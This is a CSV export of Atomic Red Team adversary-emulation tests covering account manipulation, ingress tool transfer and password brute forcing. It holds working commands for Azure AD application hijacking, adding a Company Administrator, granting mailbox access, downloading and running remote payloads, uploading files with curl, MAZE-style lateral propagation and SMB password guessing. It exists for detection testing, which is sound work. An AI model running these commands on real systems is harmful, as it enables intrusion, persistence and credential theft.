"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Domain Password Policy Check: No Uppercase Character in Password","$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",
"C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Domain Password Policy Check: No Lowercase Character in Password","$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",
"C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Domain Password Policy Check: Only Two Character Classes","$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",
"C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Domain Password Policy Check: Common Password Use","$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}
",
"C:\AtomicRedTeam\atomics\T1098\T1098.yaml","GCP - Delete Service Account Key","gcloud config set project #{project_id}
KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(KEY_ID)"" --limit=1`
gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet
","cd ""$PathToAtomicsFolder/T1098/src/T1098-17/""
terraform state rm google_service_account_key.key
terraform destroy -auto-approve
"
"C:\AtomicRedTeam\atomics\T1098.001\T1098.001.yaml","Azure AD Application Hijacking - Service Principal","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

$sp = Get-AzureADServicePrincipal -SearchString ""#{service_principal_name}"" | Select-Object -First 1
$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId
foreach ($cred in $credz) {
  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq ""AtomicTest"") {
    Write-Host ""Removed $($cred.KeyId) key from SP""
    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId
  }  
}
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq ""AtomicCert"" } | Remove-Item
"
"C:\AtomicRedTeam\atomics\T1098.001\T1098.001.yaml","Azure AD Application Hijacking - App Registration","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

$app = Get-AzureADApplication -SearchString ""#{application_name}"" | Select-Object -First 1
if ($app -eq $null) { Write-Warning ""Application not found""; exit }

# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

$app = Get-AzureADApplication -SearchString ""#{application_name}"" | Select-Object -First 1
$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId
foreach ($cred in $credz) {
  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq ""AtomicTest"") {
    Write-Host ""Removed $($cred.KeyId) key from application""
    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId
  }  
}
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq ""AtomicCert"" } | Remove-Item
"
"C:\AtomicRedTeam\atomics\T1098.001\T1098.001.yaml","AWS - Create Access Key and Secret Key","aws iam create-access-key --user-name #{username} > ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds""
cd ""$PathToAtomicsFolder/T1098.001/bin/""
./aws_secret.sh
","access_key=`cat ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds"" | jq -r '.AccessKey.AccessKeyId'`
aws iam delete-access-key --access-key-id $access_key --user-name #{username}
rm ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds""
"
"C:\AtomicRedTeam\atomics\T1098.002\T1098.002.yaml","EXO - Full access mailbox permission granted to a user","Import-Module ExchangeOnlineManagement
$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Add-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All
Disconnect-ExchangeOnline -Confirm:$false
","Import-Module ExchangeOnlineManagement
$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Remove-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All -Confirm:$false
Disconnect-ExchangeOnline -Confirm:$false
"
"C:\AtomicRedTeam\atomics\T1098.003\T1098.003.yaml","Azure AD - Add Company Administrator Role to a user","Import-Module MSOnline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""
","Remove-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
"
"C:\AtomicRedTeam\atomics\T1098.003\T1098.003.yaml","Simulate - Post BEC persistence via user password reset followed by user added to company administrator role","Import-Module MSOnline
Import-Module AzureAD
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
$targetsecurepw = ConvertTo-SecureString -String ""#{target_password}"" -AsPlainText -Force
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue

#Saving the ObjectId of the target_user into a variable
$target_objid = Get-AzureADUser -filter ""userPrincipalName eq '#{target_user}'"" | Select-Object -ExpandProperty ObjectId

#Reset the password of the target_user
Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue

#Adding target_user
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""
Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""#{target_user}""
","Import-Module MSOnline
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-MsolService -Credential $credential
Remove-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
Remove-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","rsync remote file copy (push)","rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","rsync remote file copy (pull)","rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","scp remote file copy (push)","scp #{local_file} #{username}@#{remote_host}:#{remote_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","scp remote file copy (pull)","scp #{username}@#{remote_host}:#{remote_file} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","sftp remote file copy (push)","sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","sftp remote file copy (pull)","sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","certutil download (urlcache)","cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
","del #{local_path} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","certutil download (verifyctl)","$datePath = ""certutil-$(Get-Date -format yyyy_MM_dd)""
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
","Remove-Item ""certutil-$(Get-Date -format yyyy_MM_dd)"" -Force -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows - BITSAdmin BITS Download","C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows - PowerShell Download","(New-Object System.Net.WebClient).DownloadFile(""#{remote_file}"", ""#{destination_path}"")
","Remove-Item #{destination_path} -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","OSTAP Worming Activity","pushd #{destination_path}
echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Download a File with Windows Defender MpCmdRun.exe","cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""
MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
","del #{local_path} >nul 2>&1
del %temp%\MpCmdRun.log >nul 2>&1"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","whois file download","timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}
","rm -f #{output_file}
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","File Download via PowerShell","(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","File download with finger.exe on Windows","finger base64_filedata@#{remote_host}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Download a file with IMEWDBLD.exe","$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe""
& $imewdbled #{remote_url}
","$inetcache = $env:LOCALAPPDATA + ""\Microsoft\Windows\INetCache\"" 
$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
if("""" -ne ""$file_to_be_removed"") { Remove-Item ""$file_to_be_removed"" -ErrorAction Ignore }
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Curl Download File","#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
","del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\users\public\music\allthethingsx64.dll >nul 2>&1
del c:\programdata\allthethingsx64.dll >nul 2>&1
del %Temp%\allthethingsx64.dll >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Curl Upload File","#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Download a file with Microsoft Connection Manager Auto-Download","""#{Path_to_file}"" 1>NUL 
","del /f/s/q %temp%\T1105 >nul 2>&1
rmdir /s/q %temp%\T1105 >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","MAZE Propagation Script","$machine_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt""
$offline_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt""
$completed_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt""
foreach ($machine in get-content -path ""$machine_list"")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy ""#{binary_file}"" ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}""
echo $machine >> ""$completed_list""
wmic /node: ""$machine"" process call create ""regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}""}
else
{echo $machine >> ""$offline_list""}}
","if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"") 
{foreach ($machine in get-content -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"")
{wmic /node: ""$machine"" process where name='""regsvr32.exe""' call terminate | out-null
Remove-Item -path ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"" -force -erroraction silentlycontinue}}
Remove-Item -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"" -erroraction silentlycontinue
Remove-item -path ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"" -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Printer Migration Command-Line Tool UNC share folder into a zip file","del %TEMP%\PrintBrm.zip >nul 2>&1 
#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
","del %TEMP%\PrintBrm.zip >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Lolbas replace.exe use to copy file","del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} ""#{replace_cab}"" %TEMP% /A
","del %TEMP%\redcanary.cab >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Lolbas replace.exe use to copy UNC file","del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} #{replace_cab} %TEMP% /A
","del %TEMP%\redcanary.cab >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","certreq download","certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}","del #{local_path} >nul 2>&1"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Download a file using wscript","wscript.exe ""#{vbscript_file}""
","del Atomic-License.txt >nul 2>&1"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Linux Download File and Run","curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
","rm #{payload_name}
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Nimgrab - Transfer Files","cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" #{remote_file} #{destination_path}
","del #{destination_path} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","iwr or Invoke Web-Request download","powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
","del %temp%\Atomic-license.txt >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Arbitrary file download using the Notepad++ GUP.exe binary","mkdir ""c:\Temp""
cd #{working_dir}
GUP.exe -unzipTo """" ""C:\Temp"" ""Sample #{target_file_url} #{target_file_sha256}""","rmdir /s /q ""C:\Temp\Sample"" >nul 2>nul"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","File download via nscurl","nscurl -k ""#{remote_file}"" -o ""#{destination_path}""","rm ""#{destination_path}"""
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","File Download with Sqlcmd.exe","sqlcmd -i #{remote_url} -o #{local_file_path}","rm ""#{local_file_path}"" 2>$null | Out-Null"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Remote File Copy using PSCP","fsutil file createnew C:\Temp\T1105_scp.zip 1048576
echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
","del /f /q #{exfil_package}
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows push file using scp.exe","# Check if the folder exists, create it if it doesn't
$folderPath = ""#{local_path}""
if (-Not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

# Create the file
$filePath = Join-Path -Path $folderPath -ChildPath ""#{file_name}""
New-Item -Path $filePath -ItemType File -Force
Write-Output ""File created: $filePath""

# Attack command
scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}
","$filePath = Join-Path -Path ""#{local_path}"" -ChildPath ""#{file_name}""
Remove-Item -Path $filePath -Force -erroraction silentlycontinue
Write-Output ""File deleted: $filePath""
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows pull file using scp.exe","scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows push file using sftp.exe","# Check if the folder exists, create it if it doesn't
$folderPath = ""#{local_path}""
if (-Not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}
# Create the file
$filePath = Join-Path -Path $folderPath -ChildPath ""#{file_name}""
New-Item -Path $filePath -ItemType File -Force
Write-Output ""File created: $filePath""
# Attack command
echo ""put #{local_path}\#{file_name}"" | sftp #{username}@#{remote_host}:#{remote_path}
","$filePath = Join-Path -Path ""#{local_path}"" -ChildPath ""#{file_name}""
Remove-Item -Path $filePath -Force
Write-Output ""File deleted: $filePath""
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Windows pull file using sftp.exe","sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
",
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Download a file with OneDrive Standalone Updater","if (-not (Test-Path ""#{onedrive_path}"")) {
    Write-Host ""OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue.""
    exit 1
}

New-Item -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Force | Out-Null
Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateRingSettingURLFromOC"" -Value ""#{remote_url}"" -Type String -Force
Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""ODSUUpdateXMLUrlFromOC"" -Value ""#{remote_url}"" -Type String -Force
Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateXMLUrlFromOC"" -Value ""#{remote_url}"" -Type String -Force
Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateOfficeConfigTimestamp"" -Value 99999999999 -Type QWord -Force

# Run OneDrive Standalone Updater
& ""#{onedrive_path}""
","Remove-Item -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Force -ErrorAction Ignore
Remove-Item -Path ""$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1105\T1105.yaml","Curl Insecure Connection from a Pod","kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url}
",
"C:\AtomicRedTeam\atomics\T1106\T1106.yaml","Execution through API - CreateProcess","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}""
%tmp%/T1106.exe
",
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","Brute Force Credentials of single Active Directory domain users via SMB","echo Password1> passwords.txt
echo 1q2w3e4r>> passwords.txt
echo Password!>> passwords.txt
echo Spring2022>> passwords.txt
echo ChangeMe!>> passwords.txt
@FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
",
